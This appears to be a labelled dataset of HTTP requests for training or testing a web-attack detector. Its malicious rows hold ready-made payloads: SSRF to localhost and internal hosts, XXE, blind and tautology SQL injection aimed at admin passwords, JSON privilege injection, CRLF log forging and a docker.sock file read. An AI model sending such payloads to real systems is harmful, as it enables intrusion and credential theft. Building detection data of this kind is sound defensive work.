label,text
benign,"GET /products;category=books/search HTTP/1.1
Host: novelarchivist.ai
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip
DNT: 1
Connection: close"
malicious,"POST /service/fetch/render HTTP/1.1
Host: media-renderer.cloud-images.ai
User-Agent: Python-urllib/3.8
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Content-Length: 85

imageUrl=http%3A%2F%2Fassets.social-gallery.biz%2Fphotos%2Fprofile.jpg&filter=sepia&imageUrl=http%3A%2F%2F127.0.0.1%3A8000%2Fadmin%2Fconfig"
malicious,"POST /track/log HTTP/1.1
Host: app-beacon-service.cloud
User-Agent: Python-urllib/3.9
Content-Type: application/json
Accept-Encoding: gzip
Content-Length: 258
Connection: keep-alive

{""token"":""T3872kfhe"", ""event_details"":""Button click registered\"", \""status_code\"": 200, \""user_id\"": \""admin\"", \""is_privileged\"": true, \""original_event\"": \""btn_click""}"
benign,"GET /orders/history?id=7852 HTTP/1.1
Host: trusted-payment-gateway.co
Connection: keep-alive
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate
Cookie: authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
benign,"POST /v2/user/password-reset-request HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/json
Accept: application/json
Referer: https://community.game-dev-forum.org/login
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Cache-Control: no-cache
Content-Length: 55

{""email"":""lena.roberts@community.game-dev-forum.org""}"
benign,"POST /scripts/utils/helper.js HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/javascript
Content-Length: 42
User-Agent: curl/7.79.1
Accept: */*
X-Requested-With: XMLHttpRequest
Connection: close

console.log('Helper utilities loaded successfully');"
benign,"PUT /api/orders/3567/status HTTP/1.1
Host: express-food-delivery.co
Authorization: Bearer XZT348J9sodpnCSm5249APBejlqwF6un
Origin: https://express-food-delivery.co
X-Requested-With: XMLHttpRequest
Accept: application/json
Content-Type: application/json
Accept-Encoding: gzip, deflate
Content-Length: 32

{""status"":""delivered"",""rating"":5}"
malicious,"POST /data/api/submit HTTP/1.1
Host: registry.healthcare-services.net
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: application/xml
Content-Type: application/xml
Content-Length: 210
Cache-Control: no-cache
Connection: close

<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE submission [
<!ENTITY xxe_ssrf SYSTEM ""http://192.168.0.254:8080/config"" >
]>
<submission>
  <details>&xxe_ssrf;</details>
</submission>"
benign,"POST /api/files/upload HTTP/1.1
Host: data-sync-platform.ai
Connection: keep-alive
Accept: application/json
User-Agent: python-requests/2.28.2
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoJqVdsUpTqQa27UN
Content-Length: 16490
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9

------WebKitFormBoundaryoJqVdsUpTqQa27UN
Content-Disposition: form-data; name=""attachment1""; filename=""report_q1.xlsx""
Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet

<Excel binary data: 36741 bytes>
------WebKitFormBoundaryoJqVdsUpTqQa27UN
Content-Disposition: form-data; name=""attachment2""; filename=""summary.txt""
Content-Type: text/plain

Quarter 1 performance summary:
Everything is on target.
------WebKitFormBoundaryoJqVdsUpTqQa27UN--"
benign,"PUT /repos/updates/settings HTTP/1.1
Host: code-collab-platform.io
Content-Type: application/json
If-Match: ""12345a4321bcde6789f0123456789abcd""
Connection: keep-alive
Authorization: Token ghp_abcdef1234567890tokenhere
User-Agent: curl/7.86.0
Accept: application/json
Content-Length: 119

{""branch_protection"":{""required_reviews"":2,""dismiss_stale_reviews"":true,""require_code_owner_reviews"":false},""enable_auto_merge"":true}"
benign,"POST /orders/submit HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1NiJ9.eyJzdWIiOiJ1c2VyQG9ucGQtcmV0YWlsLnBizCIsImV4cCI6MTcwMDAwMDAwMH0.JmMS3yUUyXei1-D7aZW-SYK2htzwheUyH_xLLIDoSok
X-CSRF-Token: 09f4eb17d5fe43dcbf79a56f1a8aefc7
Content-Type: application/json
Accept: application/json
Origin: https://online-retail-store.biz
X-Requested-With: FetchAPIClient
Content-Length: 68

{""cartId"":99231,""paymentMethod"":""credit_card"",""action"":""submitOrder""}"
benign,"GET /api/v4/notifications/latest HTTP/1.1
Host: community.game-dev-forum.org
X-Api-Token: d78c395f4c6e486bbd82c43ef9d21012
Accept: application/json
Referer: https://community.game-dev-forum.org/home
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Connection: keep-alive"
benign,"GET /data/v1/location/search?data=latitude%3D34.052235%26longitude%3D-118.243683%26radius_km%3D25%26types%3Dpark%2Cmuseum%2Chistoric_site%2Cbotanical_garden%2Cart_gallery HTTP/1.1
Host: urban-places.ai
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Accept-Encoding: gzip
Connection: keep-alive"
malicious,"GET /api/v2/orders/history HTTP/1.1
Host: api.quick-dealsmart.net
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
Referer: https://www.quick-dealsmart.net/dashboard
Cookie: cart_session=5324f9a1e72b4a; logged_in=true; tracking_id=xyz' OR IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61, SLEEP(5), 0)/*comment*/--"
malicious,"POST /login HTTP/1.1
Host: login-gateway.api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Referer: https://portal.api.cloud-data-services.ai/welcome
Connection: close

username=alice%0d%0a127.0.0.1%20-%20admin%20[10/Oct/2023:13:55:36%20-0700]%20""POST%20/admin/login%20HTTP/1.1""%20200%20789&password=securepass123"
benign,"GET /blog/post/view?id=2024-04-15+review+""organic+gardening""&author=Jane+O%27Connor HTTP/1.1
Host: green-thumb-gardeners.org
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Referer: https://green-thumb-gardeners.org/blog
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Connection: close"
benign,"POST /user/newsletter/signup HTTP/1.1
Host: urbanstyleforum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.62 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
Cookie: sessionid=af8d712dfcc9e2334f7c8e74b251dbf2

email=tom_sanders87%40urbanstyleforum.org"
malicious,"GET /xml_api/search_books?book_title=Lord%20of%20the%20Rings%27%20or%20%271%27%3D%271%20or%20%271%27%3D%271 HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
malicious,"GET /app/load/file%3A%2F%2F%2Fvar%2Frun%2Fdocker.sock HTTP/1.1
Host: cloud-infra-management.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml
Origin: https://cloud-infra-management.net
Connection: close"
benign,"GET /images/logo.svg HTTP/1.1
Host: creative-design-studio.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: image/svg+xml,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://creative-design-studio.net/home
Connection: keep-alive"
